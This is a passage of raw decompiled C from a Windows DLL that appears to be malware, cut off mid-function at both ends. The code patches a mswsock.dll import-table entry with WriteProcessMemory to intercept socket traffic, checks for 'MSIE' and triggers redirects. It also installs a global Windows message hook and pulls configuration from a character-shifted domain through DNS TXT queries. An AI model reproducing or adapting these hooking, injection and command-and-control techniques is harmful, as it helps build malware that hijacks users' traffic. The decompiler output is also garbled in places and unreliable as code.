                int32_t v33 = v32 + 1; // 0x10016e42
                while (*(char *)v32 != 0) {
                    // 0x10016e40
                    v32 = v33;
                    v33 = v32 + 1;
                }
                // 0x10016e47
                int32_t v34; // bp-1717, 0x10016bd0
                int32_t v35 = &v34; // 0x10016e51
                int32_t v36 = v35 + 1; // 0x10016e52
                char * v37 = (char *)v36;
                int32_t v38 = v36; // 0x10016e58
                while (*v37 != 0) {
                    // 0x10016e52
                    v36 = v38 + 1;
                    v37 = (char *)v36;
                    v38 = v36;
                }
                uint32_t v39 = v33 - v13; // 0x10016e4d
                uint32_t v40 = v39 / 4; // 0x10016e5c
                __asm_rep_movsd_memcpy(v37, v19, v40);
                bool v41; // 0x10016bd0
                int32_t v42 = v41 ? -4 : 4; // 0x10016e5f
                char * v43 = (char *)(v36 + v40 * v42); // 0x10016e6c
                __asm_rep_movsb_memcpy(v43, v43, v39 & 3);
                int32_t v44 = v11;
                int32_t v45 = v44 + 1; // 0x10016e72
                while (*(char *)v44 != 0) {
                    // 0x10016e70
                    v44 = v45;
                    v45 = v44 + 1;
                }
                int32_t v46 = v35 + 1; // 0x10016e82
                char * v47 = (char *)v46;
                int32_t v48 = v46; // 0x10016e88
                while (*v47 != 0) {
                    // 0x10016e82
                    v46 = v48 + 1;
                    v47 = (char *)v46;
                    v48 = v46;
                }
                uint32_t v49 = v45 - v11; // 0x10016e7d
                uint32_t v50 = v49 / 4; // 0x10016e8c
                __asm_rep_movsd_memcpy(v47, (char *)v10, v50);
                char * v51 = (char *)(v46 + v50 * v42); // 0x10016e96
                __asm_rep_movsb_memcpy(v51, v51, v49 & 3);
                int32_t v52 = function_1001b170(v13, (int16_t *)"36"); // 0x10016ea4
                v24 = &v31;
                v25 = 0;
                if (v52 == 0) {
                    goto lab_0x10016ecc;
                } else {
                    // 0x10016eb0
                    v25 = function_1001b170(v12, (int16_t *)"MSIE");
                    v17 = v24;
                    if (v25 != 0) {
                        goto lab_0x10016f6f_4;
                    } else {
                        goto lab_0x10016ecc;
                    }
                }
            }
        }
    }
  lab_0x10016ecc:;
    int32_t v53 = (int32_t)&v22; // 0x10016ecc
    int32_t v54 = &lpMultiByteStr; // 0x10016ed2
    int32_t v55 = v53; // 0x10016ed2
    unsigned char v56 = *(char *)v54; // 0x10016ed5
    int32_t v57 = v25 & -256; // 0x10016ed5
    unsigned char v58 = *(char *)v55; // 0x10016ed7
    bool v59; // 0x10016bd0
    int32_t v60; // 0x10016bd0
    while (v56 == v58) {
        // 0x10016edb
        v17 = v24;
        if (v56 == 0) {
            goto lab_0x10016f6f_4;
        }
        unsigned char v61 = *(char *)(v54 + 1); // 0x10016edf
        int32_t v62 = v57 | (int32_t)v61; // 0x10016edf
        unsigned char v63 = *(char *)(v55 | 1); // 0x10016ee2
        if (v61 != v63) {
            // 0x10016efa
            v59 = v61 < v63;
            v60 = v62;
            goto lab_0x10016efa_2;
        }
        // 0x10016ee7
        v54 += 2;
        v55 += 2;
        v17 = v24;
        if (v61 == 0) {
            goto lab_0x10016f6f_4;
        }
        v56 = *(char *)v54;
        v57 = v62 & -256;
        v58 = *(char *)v55;
    }
    // 0x10016efa
    v59 = v56 < v58;
    v60 = v57 | (int32_t)v56;
    goto lab_0x10016efa_2;
  lab_0x10016efa_2:;
    uint32_t v64 = v60;
    bool v65 = v59;
    int32_t v66 = v65; // 0x10016ef5
    uint32_t v67 = v64 + v66; // 0x10016ef5
    bool v68 = v65 ? v64 < (int32_t)v65 - v66 | v67 != -1 : v64 < v67; // 0x10016ef5
    v17 = v24;
    bool v69; // 0x10016bd0
    uint32_t v70; // 0x10016bd0
    if (v65 == !v68) {
        goto lab_0x10016f6f_4;
    } else {
        int32_t v71 = v53; // 0x10016f0a
        v70 = (int32_t)&lpMultiByteStr2;
        unsigned char v72 = *(char *)v70; // 0x10016f10
        unsigned char v73 = *(char *)v71; // 0x10016f12
        while (v72 == v73) {
            // 0x10016f16
            v17 = v24;
            if (v72 == 0) {
                goto lab_0x10016f6f_4;
            }
            unsigned char v74 = *(char *)(v70 + 1); // 0x10016f1a
            unsigned char v75 = *(char *)(v71 | 1); // 0x10016f1d
            if (v74 != v75) {
                // 0x10016f30
                v69 = v74 < v75;
                goto lab_0x10016f30_2;
            }
            // 0x10016f22
            v71 += 2;
            v17 = v24;
            if (v74 == 0) {
                goto lab_0x10016f6f_4;
            }
            v70 += 2;
            v72 = *(char *)v70;
            v73 = *(char *)v71;
        }
        // 0x10016f30
        v69 = v72 < v73;
        goto lab_0x10016f30_2;
    }
  lab_0x10016f30_2:;
    bool v76 = v69;
    int32_t v77 = v76; // 0x10016f30
    uint32_t v78 = v70 + v77; // 0x10016f30
    bool v79 = v76 ? v70 < (int32_t)v76 - v77 | v78 != -1 : v70 < v78; // 0x10016f30
    v17 = v24;
    if (v76 != !v79) {
        // 0x10016f39
        function_100182c0((int32_t)L"redir", v23);
        return _40___security_check_cookie_40_4();
    }
    goto lab_0x10016f6f_4;
}

// Address range: 0x10016fd0 - 0x10017243
int32_t function_10016fd0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10) {
    int32_t v1 = __readfsdword(0); // bp-20, 0x10016fe5
    __writefsdword(0, (int32_t)&v1);
    if (a5 < 0) {
        // 0x10017225
        __writefsdword(0, v1);
        return _40___security_check_cookie_40_4();
    }
    if (a6 != 0x1201f == (a6 != 0x12017)) {
        // 0x10017225
        __writefsdword(0, v1);
        return _40___security_check_cookie_40_4();
    }
    int32_t v2 = *(int32_t *)a7; // 0x100170b3
    int32_t v3 = *(int32_t *)(v2 + 4); // 0x100170b5
    uint32_t v4 = *(int32_t *)v2; // 0x100170b8
    if (a6 == 0x1201f) {
        int32_t v5 = __time64(); // 0x100170c4
        int32_t v6 = g133 + (int32_t)(v5 < g132); // 0x100170da
        if (a4 - v6 < 0) {
            // 0x10017225
            __writefsdword(0, v1);
            return _40___security_check_cookie_40_4();
        }
        if (v5 - g132 < 601 == v6 >= a4) {
            // 0x10017225
            __writefsdword(0, v1);
            return _40___security_check_cookie_40_4();
        }
        // 0x100170f9
        if (function_10016bd0(v3, v4) != 0) {
            // 0x1001710b
            g131 = a1;
            g132 = v5;
            g133 = a4;
        }
        // 0x10017225
        __writefsdword(0, v1);
        return _40___security_check_cookie_40_4();
    }
    if (a6 != 0x12017 || v4 < 100 || g131 != a1) {
        // 0x10017225
        __writefsdword(0, v1);
        return _40___security_check_cookie_40_4();
    }
    int16_t lpWideCharStr = 0; // bp-332, 0x1001715d
    int32_t v7; // bp-330, 0x10016fd0
    _memset(&v7, 0, 198);
    char lpMultiByteStr = 0; // bp-132, 0x10017176
    int32_t v8; // bp-131, 0x10016fd0
    _memset(&v8, 0, 99);
    if (function_10017850((int32_t)L"hp2", (int32_t)&lpWideCharStr, 0) != 0) {
        // 0x100171a1
        WideCharToMultiByte(936, 0, &lpWideCharStr, -1, &lpMultiByteStr, 100, NULL, NULL);
        _memset((int32_t *)v3, 0, v4);
        char * v9 = __strdup((char *)&g76); // 0x100171cf
        function_10018fb0((int32_t *)&g76, 1);
        _sprintf((char *)v3, v9);
        _free((int32_t *)v9);
    }
    // 0x100171f6
    g131 = 0;
    // 0x10017225
    __writefsdword(0, v1);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10017250 - 0x100173c1
int32_t function_10017250(void) {
    int32_t * v1 = LoadLibraryW(L"mswsock.dll"); // 0x10017266
    if (v1 == NULL || *(int16_t *)v1 != 0x5a4d) {
        // 0x10017272
        return _40___security_check_cookie_40_4();
    }
    int32_t v2 = (int32_t)v1; // 0x10017266
    int32_t v3 = *(int32_t *)(v2 + 60) + v2;
    if (*(int32_t *)v3 != 0x4550) {
        // 0x10017272
        return _40___security_check_cookie_40_4();
    }
    int32_t v4 = *(int32_t *)(v3 + 128); // 0x10017299
    if (v4 == 0 || *(int32_t *)(v3 + 132) == 0) {
        // 0x10017272
        return _40___security_check_cookie_40_4();
    }
    int32_t v5 = v4 + v2;
    int32_t v6 = v5; // bp-36, 0x100172b8
    if (*(int32_t *)(v5 + 16) == 0) {
        // 0x10017364
        return _40___security_check_cookie_40_4();
    }
    // 0x100172c1
    int32_t v7; // bp-56, 0x10017250
    int32_t v8 = &v7; // 0x100172b7
    int32_t * v9 = (int32_t *)(v8 - 4);
    int32_t * v10 = (int32_t *)(v8 - 8);
    char * v11; // bp-32, 0x10017250
    int32_t v12 = (int32_t)&v11;
    *v9 = (int32_t)"ntdll.dll";
    *v10 = *(int32_t *)(v5 + 12) + v2;
    int32_t v13 = __stricmp((char *)&g173, (char *)&g173); // 0x100172cc
    int32_t v14 = v5; // 0x100172d6
    int32_t v15; // 0x10017250
    int32_t v16; // 0x10017250
    int32_t v17; // 0x10017250
    int32_t v18; // 0x10017250
    int32_t v19; // bp-40, 0x10017250
    int32_t v20; // 0x10017317
    int32_t v21; // 0x1001732a
    int32_t v22; // 0x10017380
    int32_t v23; // 0x10017348
    int32_t v24; // 0x10017348
    if (v13 == 0) {
        // 0x100172e0
        v11 = (char *)0x6241714b;
        *v9 = 3;
        *v10 = v12;
        v20 = *(int32_t *)v5 + v2;
        function_10018f90((int32_t)v11, 0x62606673, 0x6c406c46, 0x6c6f716b, 0x69664369, 98);
        v21 = *(int32_t *)v20;
        v15 = v21;
        v18 = v20;
        if (v21 != 0) {
            v17 = 1;
            *v9 = v12;
            *v10 = v2 + 2 + v15;
            if (__stricmp((char *)&g173, (char *)&g173) == 0) {
                // 0x10017377
                v22 = v2 - 4 + 4 * v17 + *(int32_t *)(v6 + 16);
                v19 = 0x10016fd0;
                *v9 = (int32_t)&v6;
                g130 = *(int32_t *)v22;
                *v10 = 4;
                *(int32_t *)(v8 - 12) = (int32_t)&v19;
                *(int32_t *)(v8 - 16) = v22;
                *(int32_t *)(v8 - 20) = (int32_t)GetCurrentProcess();
                WriteProcessMemory(&g173, &g173, &g173, (int32_t)&g173, &g173);
                return _40___security_check_cookie_40_4();
            }
            // 0x10017348
            v23 = v18 + 4;
            v24 = *(int32_t *)v23;
            v18 = v23;
            v16 = v17 + 1;
            while (v24 != 0) {
                // 0x10017333
                v17 = v16;
                *v9 = v12;
                *v10 = v2 + 2 + v24;
                if (__stricmp((char *)&g173, (char *)&g173) == 0) {
                    // 0x10017377
                    v22 = v2 - 4 + 4 * v17 + *(int32_t *)(v6 + 16);
                    v19 = 0x10016fd0;
                    *v9 = (int32_t)&v6;
                    g130 = *(int32_t *)v22;
                    *v10 = 4;
                    *(int32_t *)(v8 - 12) = (int32_t)&v19;
                    *(int32_t *)(v8 - 16) = v22;
                    *(int32_t *)(v8 - 20) = (int32_t)GetCurrentProcess();
                    WriteProcessMemory(&g173, &g173, &g173, (int32_t)&g173, &g173);
                    return _40___security_check_cookie_40_4();
                }
                // 0x10017348
                v23 = v18 + 4;
                v24 = *(int32_t *)v23;
                v18 = v23;
                v16 = v17 + 1;
            }
        }
        // 0x10017353
        v14 = v6;
    }
    int32_t v25 = v14 + 20;
    v6 = v25;
    while (*(int32_t *)(v14 + 36) != 0) {
        int32_t v26 = v25;
        *v9 = (int32_t)"ntdll.dll";
        *v10 = *(int32_t *)(v26 + 12) + v2;
        v13 = __stricmp((char *)&g173, (char *)&g173);
        v14 = v26;
        if (v13 == 0) {
            // 0x100172e0
            v11 = (char *)0x6241714b;
            *v9 = 3;
            *v10 = v12;
            v20 = *(int32_t *)v26 + v2;
            function_10018f90((int32_t)v11, 0x62606673, 0x6c406c46, 0x6c6f716b, 0x69664369, 98);
            v21 = *(int32_t *)v20;
            v15 = v21;
            v18 = v20;
            if (v21 != 0) {
                v17 = 1;
                *v9 = v12;
                *v10 = v2 + 2 + v15;
                if (__stricmp((char *)&g173, (char *)&g173) == 0) {
                    // 0x10017377
                    v22 = v2 - 4 + 4 * v17 + *(int32_t *)(v6 + 16);
                    v19 = 0x10016fd0;
                    *v9 = (int32_t)&v6;
                    g130 = *(int32_t *)v22;
                    *v10 = 4;
                    *(int32_t *)(v8 - 12) = (int32_t)&v19;
                    *(int32_t *)(v8 - 16) = v22;
                    *(int32_t *)(v8 - 20) = (int32_t)GetCurrentProcess();
                    WriteProcessMemory(&g173, &g173, &g173, (int32_t)&g173, &g173);
                    return _40___security_check_cookie_40_4();
                }
                // 0x10017348
                v23 = v18 + 4;
                v24 = *(int32_t *)v23;
                v18 = v23;
                v16 = v17 + 1;
                while (v24 != 0) {
                    // 0x10017333
                    v17 = v16;
                    *v9 = v12;
                    *v10 = v2 + 2 + v24;
                    if (__stricmp((char *)&g173, (char *)&g173) == 0) {
                        // 0x10017377
                        v22 = v2 - 4 + 4 * v17 + *(int32_t *)(v6 + 16);
                        v19 = 0x10016fd0;
                        *v9 = (int32_t)&v6;
                        g130 = *(int32_t *)v22;
                        *v10 = 4;
                        *(int32_t *)(v8 - 12) = (int32_t)&v19;
                        *(int32_t *)(v8 - 16) = v22;
                        *(int32_t *)(v8 - 20) = (int32_t)GetCurrentProcess();
                        WriteProcessMemory(&g173, &g173, &g173, (int32_t)&g173, &g173);
                        return _40___security_check_cookie_40_4();
                    }
                    // 0x10017348
                    v23 = v18 + 4;
                    v24 = *(int32_t *)v23;
                    v18 = v23;
                    v16 = v17 + 1;
                }
            }
            // 0x10017353
            v14 = v6;
        }
        // 0x1001735a
        v25 = v14 + 20;
        v6 = v25;
    }
    // 0x10017364
    return _40___security_check_cookie_40_4();
}

// Address range: 0x100173d0 - 0x100173ef
int32_t _CallBack_40_12(int32_t nCode, int32_t wParam, int32_t lParam) {
    // 0x100173d0
    return CallNextHookEx((int32_t *)g129, nCode, wParam, lParam);
}

// Address range: 0x100173f0 - 0x10017495
int32_t _Init_40_16(int32_t a1) {
    int32_t * v1 = CreateMutexW(NULL, false, L"extmutex"); // 0x100173ff
    if (v1 == NULL) {
        // 0x1001748f
        return (int32_t)v1;
    }
    // 0x1001740d
    if (GetLastError() == 183) {
        // 0x1001748f
        return 183;
    }
    int32_t hmod = g118; // 0x10017421
    if (g118 == 0) {
        // 0x10017423
        g118 = a1;
        hmod = a1;
    }
    // 0x1001742b
    if (g129 != 0) {
        // 0x1001748f
        return hmod;
    }
    // 0x10017434
    g129 = (int32_t)SetWindowsHookExW(3, (int32_t (*)(int32_t, int32_t, int32_t))0x100173d0, (int32_t *)hmod, 0);
    int32_t lpMsg; // bp-32, 0x100173f0
    if (!GetMessageW((struct tagMSG *)&lpMsg, NULL, 0, 0)) {
        // 0x1001748f
        return 0;
    }
    int32_t v2 = &lpMsg; // 0x10017473
    int32_t v3; // bp-88, 0x100173f0
    int32_t v4 = &v3; // 0x1001746e
    *(int32_t *)(v4 - 4) = v2;
    TranslateMessage((struct tagMSG *)&g173);
    *(int32_t *)(v4 - 8) = v2;
    DispatchMessageW((struct tagMSG *)&g173);
    *(int32_t *)(v4 - 12) = 0;
    *(int32_t *)(v4 - 16) = 0;
    *(int32_t *)(v4 - 20) = 0;
    v4 -= 24;
    *(int32_t *)v4 = v2;
    bool result = GetMessageW((struct tagMSG *)&g173, &g173, (int32_t)&g173, (int32_t)&g173); // 0x10017486
    while (result) {
        // 0x10017470
        *(int32_t *)(v4 - 4) = v2;
        TranslateMessage((struct tagMSG *)&g173);
        *(int32_t *)(v4 - 8) = v2;
        DispatchMessageW((struct tagMSG *)&g173);
        *(int32_t *)(v4 - 12) = 0;
        *(int32_t *)(v4 - 16) = 0;
        *(int32_t *)(v4 - 20) = 0;
        v4 -= 24;
        *(int32_t *)v4 = v2;
        result = GetMessageW((struct tagMSG *)&g173, &g173, (int32_t)&g173, (int32_t)&g173);
    }
    // 0x1001748f
    return result;
}

// Address range: 0x100174a0 - 0x100174d0
int32_t function_100174a0(void) {
    // 0x100174a0
    if (g129 != 0) {
        // 0x100174a9
        return 0;
    }
    int32_t * v1 = SetWindowsHookExW(3, (int32_t (*)(int32_t, int32_t, int32_t))0x100173d0, (int32_t *)g118, 0); // 0x100174bb
    g129 = (int32_t)v1;
    return v1 != NULL;
}

// Address range: 0x100174d0 - 0x1001750d
int32_t function_100174d0(void) {
    // 0x100174d0
    GetPrivateProfileStringW(L"config", L"last", (int16_t *)&g31, (int16_t *)&g134, 255, (int16_t *)&g111);
    int16_t * v1 = _wcsstr((int16_t *)&g134, (int16_t *)&g30); // 0x100174fe
    return v1 != NULL;
}

// Address range: 0x10017510 - 0x10017670
int32_t function_10017510(int32_t lpWideCharStr, int32_t a2) {
    int16_t lpWideCharStr2 = 0; // bp-776, 0x1001753a
    int32_t v1; // bp-774, 0x10017510
    _memset(&v1, 0, 510);
    char lpMultiByteStr = 0; // bp-264, 0x10017554
    int32_t v2; // bp-263, 0x10017510
    _memset(&v2, 0, 255);
    WideCharToMultiByte(0, 0, (int16_t *)lpWideCharStr, -1, &lpMultiByteStr, 255, NULL, NULL);
    int32_t ppQueryResults = 0; // bp-780, 0x10017596
    if (DnsQuery_A(&lpMultiByteStr, 16, 0, NULL, &ppQueryResults, NULL) != 0) {
        // 0x1001765e
        return _40___security_check_cookie_40_4();
    }
    // 0x100175ad
    if (*(int16_t *)(ppQueryResults + 8) != 16 || *(int32_t *)(ppQueryResults + 24) == 0) {
        // 0x10017656
        DnsFree((int32_t *)ppQueryResults, 1);
        // 0x1001765e
        return _40___security_check_cookie_40_4();
    }
    // 0x100175c8
    _strncpy(&lpMultiByteStr, (char *)*(int32_t *)(ppQueryResults + 28), 255);
    UrlUnescapeA(&lpMultiByteStr, NULL, NULL, 0x100000);
    MultiByteToWideChar(936, 0, &lpMultiByteStr, -1, &lpWideCharStr2, 255);
    int32_t v3 = &lpWideCharStr2; // 0x10017618
    int32_t v4 = v3; // 0x10017622
    int16_t v5 = *(int16_t *)v4; // 0x10017624
    *(int16_t *)(a2 - v3 + v4) = v5;
    v4 += 2;
    while (v5 != 0) {
        // 0x10017624
        v5 = *(int16_t *)v4;
        *(int16_t *)(a2 - v3 + v4) = v5;
        v4 += 2;
    }
    // 0x10017633
    DnsFree((int32_t *)ppQueryResults, 1);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10017670 - 0x10017850
int32_t function_10017670(void) {
    // 0x10017670
    int32_t lpWideCharStr; // bp-60, 0x10017670
    __asm_rep_movsd_memcpy((char *)&lpWideCharStr, (char *)L"dpog/dbsfgsff/xjgjqz/dpn", 12);
    int32_t v1 = &lpWideCharStr; // 0x10017694
    int32_t v2 = v1; // 0x1001769e
    while (*(int16_t *)v2 != 0) {
        // 0x100176a0
        v2 += 2;
    }
    // 0x100176ab
    int32_t v3; // bp-4, 0x10017670
    int32_t v4 = &v3; // 0x10017671
    int32_t v5; // bp-58, 0x10017670
    int32_t v6 = &v5; // 0x1001769b
    if (v2 != v6) {
        int32_t v7; // 0x100176c5
        for (int32_t i = 0; i < (v7 - v6) / 2; i++) {
            int16_t * v8 = (int16_t *)(v4 - 56 + 2 * i); // 0x100176b6
            *v8 = *v8 - 1;
            int32_t v9 = v1;
            v7 = v9 + 2;
            while (*(int16_t *)v9 != 0) {
                // 0x100176c2
                v9 = v7;
                v7 = v9 + 2;
            }
        }
    }
    int16_t lpWideCharStr2 = 0; // bp-828, 0x100176e4
    int32_t v10; // bp-826, 0x10017670
    _memset(&v10, 0, 510);
    char lpMultiByteStr = 0; // bp-316, 0x100176fe
    int32_t v11; // bp-315, 0x10017670
    _memset(&v11, 0, 255);
    WideCharToMultiByte(0, 0, (int16_t *)&lpWideCharStr, -1, &lpMultiByteStr, 255, NULL, NULL);
    int32_t ppQueryResults = 0; // bp-832, 0x10017743
    if (DnsQuery_A(&lpMultiByteStr, 16, 0, NULL, &ppQueryResults, NULL) != 0) {
        // 0x10017840
        return _40___security_check_cookie_40_4();
    }
    // 0x1001775c
    if (*(int16_t *)(ppQueryResults + 8) != 16 || *(int32_t *)(ppQueryResults + 24) == 0) {
        // 0x10017838
        DnsFree((int32_t *)ppQueryResults, 1);
        // 0x10017840
        return _40___security_check_cookie_40_4();
    }
    // 0x10017777
    _strncpy(&lpMultiByteStr, (char *)*(int32_t *)(ppQueryResults + 28), 255);
    UrlUnescapeA(&lpMultiByteStr, NULL, NULL, 0);
    MultiByteToWideChar(936, 0, &lpMultiByteStr, -1, &lpWideCharStr2, 255);
    int32_t v12 = 0; // 0x100177c9
    int16_t v13 = *(int16_t *)(v4 - 824 + v12); // 0x100177d0
    *(int16_t *)(v12 + (int32_t)&g134) = v13;
    v12 += 2;
    while (v13 != 0) {
        // 0x100177d0
        v13 = *(int16_t *)(v4 - 824 + v12);
        *(int16_t *)(v12 + (int32_t)&g134) = v13;
        v12 += 2;
    }
    // 0x100177e7
    DnsFree((int32_t *)ppQueryResults, 1);
    if (_wcsstr((int16_t *)&g134, (int16_t *)&g30) == NULL) {
        // 0x10017840
        return _40___security_check_cookie_40_4();
    }
    // 0x1001780b
    WritePrivateProfileStringW(L"config", L"last", (int16_t *)&g134, (int16_t *)&g111);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10017850 - 0x10017982
int32_t function_10017850(int32_t a1, int32_t a2, int32_t a3) {
    // 0x10017850
    int32_t v1; // bp-48, 0x10017850
    int32_t v2 = &v1; // 0x10017875
    int32_t v3 = a1; // 0x1001787a
    int16_t v4 = *(int16_t *)v3; // 0x10017880
    *(int16_t *)(v2 - a1 + v3) = v4;
    v3 += 2;
    while (v4 != 0) {
        // 0x10017880
        v4 = *(int16_t *)v3;
        *(int16_t *)(v2 - a1 + v3) = v4;
        v3 += 2;
    }
    // 0x1001788f
    int32_t v5; // bp-50, 0x10017850
    int32_t v6 = &v5; // 0x10017892
    v6 += 2;
    while (*(int16_t *)v6 != 0) {
        // 0x10017895
        v6 += 2;
    }
    int16_t * v7 = a3 != 0 ? (int16_t *)a3 : (int16_t *)&g134; // 0x100178aa
    *(int32_t *)v6 = 61;
    int16_t * v8 = _wcsstr(v7, (int16_t *)&v1); // 0x100178ad
    int32_t v9 = v2; // 0x100178b9
    if (v8 == NULL) {
        // 0x1001796f
        *(int16_t *)a2 = 0;
        return _40___security_check_cookie_40_4();
    }
    while (*(int16_t *)v9 != 0) {
        // 0x100178c5
        v9 += 2;
    }
    // 0x100178d0
    int32_t v10; // bp-46, 0x10017850
    int32_t v11 = v9 - (int32_t)&v10 + (int32_t)v8; // 0x100178d4
    int16_t v12 = *(int16_t *)v11; // 0x100178d7
    int16_t v13 = v12; // 0x100178dd
    int32_t v14 = v11; // 0x100178dd
    int32_t v15 = a2; // 0x100178dd
    int32_t v16 = a2; // 0x100178dd
    if (v12 != 0) {
        v16 = v15;
        while (v13 != 59) {
            // 0x100178e6
            v14 += 2;
            *(int16_t *)v15 = v13;
            v13 = *(int16_t *)v14;
            v15 += 2;
            v16 = v15;
            if (v13 == 0) {
                // break -> 0x100178f7
                break;
            }
            v16 = v15;
        }
    }
    // 0x100178f7
    *(int16_t *)v16 = 0;
    if ((int32_t)_wcsstr((int16_t *)a2, L"gsso9") != a2) {
        // 0x10017943
        return _40___security_check_cookie_40_4();
    }
    int32_t v17 = a2; // 0x1001790c
    while (*(int16_t *)v17 != 0) {
        // 0x10017915
        v17 += 2;
    }
    int32_t v18 = a2 + 2; // 0x10017912
    if (v17 - v18 < 2) {
        // 0x10017943
        return _40___security_check_cookie_40_4();
    }
    int32_t v19; // 0x10017933
    for (int32_t i = 0; i < (v19 - v18) / 2; i++) {
        int16_t * v20 = (int16_t *)(2 * i + a2); // 0x10017926
        *v20 = *v20 + 1;
        int32_t v21 = a2;
        v19 = v21 + 2;
        while (*(int16_t *)v21 != 0) {
            // 0x10017930
            v21 = v19;
            v19 = v21 + 2;
        }
    }
    // 0x10017943
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10017990 - 0x100179ef
int32_t function_10017990(int32_t a1, int32_t a2) {
    // 0x10017990
    int32_t v1; // bp-528, 0x10017990
    if (function_10017850(a1, (int32_t)&v1, a2) == 0) {
        // 0x100179df
        return _40___security_check_cookie_40_4();
    }
    // 0x100179be
    __wcstol_l((int16_t *)&v1, NULL, 10, (struct __locale_struct *)&g173);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x100179f0 - 0x10017a36
int32_t function_100179f0(int32_t a1, int32_t a2) {
    int32_t v1 = a2; // bp-8, 0x100179f9
    int32_t v2; // 0x100179f0
    int32_t v3 = __strlwr_s(a1, a2, v2); // 0x100179fb
    g171 = v3;
    int32_t v4; // bp-4, 0x100179f0
    int32_t v5 = &v4; // 0x10017a00
    int32_t v6 = v5; // 0x10017a0f
    int32_t v7 = v5; // 0x10017a0f
    int32_t result = v3; // 0x10017a0f
    switch (v3) {
        case 12: {
            // 0x10017a16
            v1 = -0x7ff8fff2;
            function_100108b0(-0x7ff8fff2);
            v6 = &v1;
        }
        case 22: {
        }
        case 34: {
            // 0x10017a20
            v7 = v6 - 4;
            *(int32_t *)v7 = -0x7ff8ffa9;
            function_100108b0((int32_t)&g173);
        }
        default: {
            // 0x10017a2a
            *(int32_t *)(v7 - 4) = -0x7fffbffb;
            result = function_100108b0((int32_t)&g173);
        }
        case 0: {
        }
        case 80: {
            // 0x10017a34
            return result;
        }
    }
}

// Address range: 0x10017aa0 - 0x10017aee
int32_t function_10017aa0(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = a4; // bp-8, 0x10017aac
    int32_t v2; // 0x10017aa0
    int32_t v3 = __ultoa_s(a1, a2, a3, a4, v2); // 0x10017ab3
    g172 = v3;
    int32_t v4; // bp-4, 0x10017aa0
    int32_t v5 = &v4; // 0x10017ab8
    int32_t v6 = v5; // 0x10017ac7
    int32_t v7 = v5; // 0x10017ac7
    int32_t result = v3; // 0x10017ac7
    switch (v3) {
        case 12: {
            // 0x10017ace
            v1 = -0x7ff8fff2;
            function_100108b0(-0x7ff8fff2);
            v6 = &v1;
        }
        case 22: {
        }
        case 34: {
            // 0x10017ad8
            v7 = v6 - 4;
            *(int32_t *)v7 = -0x7ff8ffa9;
            function_100108b0((int32_t)&g173);
        }
        default: {
            // 0x10017ae2
            *(int32_t *)(v7 - 4) = -0x7fffbffb;
            result = function_100108b0((int32_t)&g173);
        }
        case 0: {
        }
        case 80: {
            // 0x10017aec
            return result;
        }
    }
}

// Address range: 0x10017b60 - 0x10017b9b
int32_t function_10017b60(int32_t a1) {
    int32_t v1 = a1 & 255; // 0x10017b63
    char v2 = a1; // 0x10017b66
    if (v2 < 58) {
        // 0x10017b6e
        return v1 - 48;
    }
    if (v2 < 71) {
        // 0x10017b7e
        return v1 - 55;
    }
    if (v2 < 103) {
        // 0x10017b8e
        return v1 - 87;
    }
    // 0x10017b96
    return -1;
}

// Address range: 0x10017ba0 - 0x10017c9f
int32_t function_10017ba0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7) {
    // 0x10017ba0
    int32_t v1; // bp-8, 0x10017ba0
    int32_t * v2 = &v1; // 0x10017ba9
    if (a1 == 0) {
        int32_t v3 = -0x7fffbffb; // bp-12, 0x10017bab
        function_100108b0(-0x7fffbffb);
        v2 = &v3;
    }
    int32_t v4 = (int32_t)v2;
    int32_t v5 = v4; // 0x10017bba
    if (a2 == 0) {
        // 0x10017bbc
        v5 = v4 - 4;
        *(int32_t *)v5 = -0x7fffbffb;
        function_100108b0((int32_t)&g173);
    }
    int32_t v6 = a4; // 0x10017bcb
    int32_t v7 = v5; // 0x10017bcb
    if (a4 == 0) {
        // 0x10017bcd
        v7 = v5 - 4;
        *(int32_t *)v7 = -0x7fffbffb;
        v6 = function_100108b0((int32_t)&g173);
    }
    int32_t v8 = v6; // 0x10017bdb
    if (a5 == 0) {
        // 0x10017bdd
        *(int32_t *)(v7 - 4) = -0x7fffbffb;
        v8 = function_100108b0((int32_t)&g173);
    }
    char v9 = *(char *)a2; // 0x10017be7
    int32_t * v10 = (int32_t *)a1; // 0x10017beb
    int32_t v11 = *v10; // 0x10017beb
    int32_t v12 = *(int32_t *)v8; // 0x10017bf1
    v1 = a3;
    int32_t result = 0; // 0x10017bfd
    int32_t v13 = a3; // 0x10017bfd
    int32_t v14 = v11; // 0x10017bfd
    int32_t v15 = v12; // 0x10017bfd
    if (v9 != 47 == (v9 != 92)) {
        goto lab_0x10017c89;
    } else {
        char v16 = *(char *)v12; // 0x10017c08
        switch (v16) {
            case 47: {
                goto lab_0x10017c83;
            }
            case 92: {
                goto lab_0x10017c83;
            }
            default: {
                // 0x10017c14
                result = 0;
                v13 = a3;
                v14 = v11;
                v15 = v12;
                if (v16 != 46) {
                    goto lab_0x10017c89;
                } else {
                    char v17 = *(char *)(v12 + 1); // 0x10017c19
                    switch (v17) {
                        case 47: {
                            goto lab_0x10017c2a;
                        }
                        case 92: {
                            goto lab_0x10017c2a;
                        }
                        default: {
                            // 0x10017c26
                            result = 0;
                            v13 = a3;
                            v14 = v11;
                            v15 = v12;
                            if (v17 != 0) {
                                goto lab_0x10017c89;
                            } else {
                                goto lab_0x10017c2a;
                            }
                        }
                    }
                }
            }
        }
    }
  lab_0x10017c75:;
    // 0x10017c75
    int32_t v18; // 0x10017ba0
    int32_t v19; // 0x10017ba0
    int32_t v20; // 0x10017ba0
    result = v18 == v20 + 1 ? 1 : v19;
    v13 = v18;
    int32_t v21; // 0x10017ba0
    v14 = v21 + (int32_t)(v18 != v20 + 1);
    v15 = v18 == v20 + 1 ? v12 + 2 : v12;
    goto lab_0x10017c89;
  lab_0x10017c89:
    // 0x10017c89
    *v10 = v14;
    *(int32_t *)a4 = v15;
    *(int32_t *)a5 = v13;
    return result;
  lab_0x10017c83:
    // 0x10017c83
    result = 1;
    v13 = a3;
    v14 = v11;
    v15 = v12 + 1;
    goto lab_0x10017c89;
  lab_0x10017c2a:;
    int32_t v22 = a3 - 1; // 0x10017c2a
